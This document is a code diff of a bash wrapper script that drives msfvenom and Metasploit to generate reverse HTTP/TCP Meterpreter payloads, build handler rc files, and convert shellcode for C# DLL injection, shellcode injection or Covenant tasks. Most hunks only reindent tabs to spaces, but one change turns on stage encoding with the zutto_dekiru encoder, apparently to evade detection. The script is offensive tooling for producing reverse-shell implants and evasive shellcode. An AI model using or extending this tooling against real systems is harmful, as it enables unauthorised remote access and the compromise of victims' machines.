@@ -23,7 +23,7 @@ CS=0
 
 write_encoder(){
 
-	echo "#!/usr/bin/env python
+    echo "#!/usr/bin/env python
 import sys
 import argparse
 import gzip
@@ -150,9 +150,9 @@ create_rc () {
         echo "set LPORT $LPORT" >> $rc_file
         echo "set EXITFUNC thread" >> $rc_file
         echo "set Autoloadstdapi false" >> $rc_file
-        # echo "set EnableStageEncoding true" >> $rc_file
-        # echo "set StagerEncoder x64/zutto_dekiru" >> $rc_file
-        # echo "set StageEncodingFallback false" >> $rc_file
+        echo "set EnableStageEncoding true" >> $rc_file
+        echo "set StagerEncoder x64/zutto_dekiru" >> $rc_file
+        echo "set StageEncodingFallback false" >> $rc_file
         echo "set WfsDelay 60" >> $rc_file
 
         # autoverifysession=false autoloadstdapi=false enablestageencoding=true stagerencoder=x64/zutto_dekiru StageEncodingFallback=false EXITFUNC=process WfsDelay=60
@@ -243,7 +243,7 @@ while (( "$#" )); do
             shift 1
             ;;
         --dump)
-			CACHE=1
+            CACHE=1
             DUMP=1
             shift 1
             ;;
@@ -298,41 +298,41 @@ if [ $CACHE -gt 0 ]; then
         echo "[-] No cached payload in memory"
     else
         echo "[+] Last payload used:"
-    	if [ $DUMP -gt 0 ]; then
-    		cat $MSF_LAST_HTTPREV
-    	else
-	        echo $MSF_LAST_HTTPREV
-	    fi
+        if [ $DUMP -gt 0 ]; then
+            cat $MSF_LAST_HTTPREV
+        else
+            echo $MSF_LAST_HTTPREV
+        fi
     fi
     if [[ "$MSF_LAST_HTTPREV_RDI" == "" ]]; then
         echo "[-] No cached RDI payload in memory"
     else
         echo "[+] Last RDI payload used:"
-    	if [ $DUMP -gt 0 ]; then
-    		cat $MSF_LAST_HTTPREV_RDI
-    	else
-	        echo $MSF_LAST_HTTPREV_RDI
-	    fi
+        if [ $DUMP -gt 0 ]; then
+            cat $MSF_LAST_HTTPREV_RDI
+        else
+            echo $MSF_LAST_HTTPREV_RDI
+        fi
     fi
     if [[ "$MSF_LAST_HTTPREV_RC" == "" ]]; then
         echo "[-] No cached RC File in memory"
     else
         echo "[+] Last RC used:"
-    	if [ $DUMP -gt 0 ]; then
-    		cat $MSF_LAST_HTTPREV_RC
-    	else
-	        echo $MSF_LAST_HTTPREV_RC
-	    fi
+        if [ $DUMP -gt 0 ]; then
+            cat $MSF_LAST_HTTPREV_RC
+        else
+            echo $MSF_LAST_HTTPREV_RC
+        fi
     fi
     if [[ "$MSF_LAST_HTTPREV_SHELLEX" == "" ]]; then
         echo "[-] No cached C# shellcode file in memory"
     else
         echo "[+] Last C# shellcode file used:"
-    	if [ $DUMP -gt 0 ]; then
-    		cat $MSF_LAST_HTTPREV_SHELLEX
-    	else
-	        echo $MSF_LAST_HTTPREV_SHELLEX
-	    fi
+        if [ $DUMP -gt 0 ]; then
+            cat $MSF_LAST_HTTPREV_SHELLEX
+        else
+            echo $MSF_LAST_HTTPREV_SHELLEX
+        fi
     fi
 
     exit 1
@@ -365,7 +365,7 @@ platform="windows"
 base_payload_name="windows"
 
 if [ $LINUX -gt 0 ]; then
-	STAGED=1
+    STAGED=1
     platform="linux"
     base_payload_name="linux"
 fi
@@ -390,7 +390,7 @@ elif [ $SSL -eq 0 -a $STAGED -eq 1 ]; then
 fi
 
 if [ $LINUX -gt 0 ]; then
-	payload_name=$(echo $payload_name | sed 's/http/tcp/g')
+    payload_name=$(echo $payload_name | sed 's/http/tcp/g')
 fi
 
 payload_name="$base_payload_name/$payload_name"
@@ -406,7 +406,8 @@ fi
 session_file=$(mktemp /tmp/msf-revhttp.XXXXXXXXXXXXX)
 
 echo "[*] Generating $arch payload"
-cmd="msfvenom -p $payload_name LHOST=$IFACE LPORT=$LPORT EXITFUNC=$exitfunc AutoVerifySession=false Autoloadstdapi=false EXITFUNC=process WfsDelay=60 -f $ptype -o $FNAME --platform $platform -a $msfarch"
+options="autoverifysession=false autoloadstdapi=false enablestageencoding=true stagerencoder=x64/zutto_dekiru StageEncodingFallback=false AutoVerifySession=false Autoloadstdapi=false WfsDelay=60"
+cmd="msfvenom -p $payload_name LHOST=$IFACE LPORT=$LPORT EXITFUNC=$exitfunc $options -f $ptype -o $FNAME --platform $platform -a $msfarch"
 
 echo "  [>] Executing: $cmd"
 
@@ -423,44 +424,44 @@ echo "$payload" > "$payload_file"
 export MSF_LAST_HTTPREV=$payload_file
 
 if [ $RDI -gt 0 ]; then
-	$CONVERTER $FNAME
-	pic_file=$(echo "$FNAME" | sed 's/\.raw$/\.bin/g')
-	payload=$(base64 -w0 $pic_file)
-	export MSF_LAST_HTTPREV_RDI=$pic_file
-	msg="[+] Final payload (to use with C# dll injection):"
+    $CONVERTER $FNAME
+    pic_file=$(echo "$FNAME" | sed 's/\.raw$/\.bin/g')
+    payload=$(base64 -w0 $pic_file)
+    export MSF_LAST_HTTPREV_RDI=$pic_file
+    msg="[+] Final payload (to use with C# dll injection):"
 elif [ $CSE -gt 0 ]; then
-	msg="[+] Final payload (to use with C# shellcode injection):"
-	tmpfname="$FNAME-hex"
-	cat $FNAME | tr -d "\n" | sed -e 's/^.*{//g' -e 's/\}.*$//g' -e 's/0x//g' -e 's/,//g' | xxd -r -p - > $tmpfname
-	payload=$(base64 -w0 $tmpfname)
-	echo "$payload" > "$cse_file"
-	export MSF_LAST_HTTPREV_SHELLEX=$cse_file
+    msg="[+] Final payload (to use with C# shellcode injection):"
+    tmpfname="$FNAME-hex"
+    cat $FNAME | tr -d "\n" | sed -e 's/^.*{//g' -e 's/\}.*$//g' -e 's/0x//g' -e 's/,//g' | xxd -r -p - > $tmpfname
+    payload=$(base64 -w0 $tmpfname)
+    echo "$payload" > "$cse_file"
+    export MSF_LAST_HTTPREV_SHELLEX=$cse_file
 else
-	msg="[+] Final payload (to use in covenant shellcode task):"
+    msg="[+] Final payload (to use in covenant shellcode task):"
 fi
 
 
 if [ $RLE -gt 0 ] && ([ ! $RDI -eq 0 ] || [ ! $CSE -eq 0 ]); then
-	echo "[+] Encoding payload with RLE"
-	write_encoder
-	payload=$($ENCODER "$payload")
-	echo "$payload" > "$rdi_file"
+    echo "[+] Encoding payload with RLE"
+    write_encoder
+    payload=$($ENCODER "$payload")
+    echo "$payload" > "$rdi_file"
 elif [ $RLE -gt 0 ] && [ $RDI -eq 0 ] && [ $CSE -eq 0 ]; then
-	echo "[-] RLE Encoding not supported for raw shellcode"
+    echo "[-] RLE Encoding not supported for raw shellcode"
 fi
 
 echo "$msg"
 
 if [ $CLIPBOARD -gt 0 ]; then
-	echo -n "$payload" | xclip -i -selection clipboard
+    echo -n "$payload" | xclip -i -selection clipboard
 fi
 
 echo $payload
 
 
 if [ $RC_CREATE -gt 0 ]; then
-	rc_file="$session_file.rc"
-	export MSF_LAST_HTTPREV_RC=$rc_file
+    rc_file="$session_file.rc"
+    export MSF_LAST_HTTPREV_RC=$rc_file
     create_rc $rc_file "$payload_name"
     res=$?
     if [ $res -gt 0 ]; then
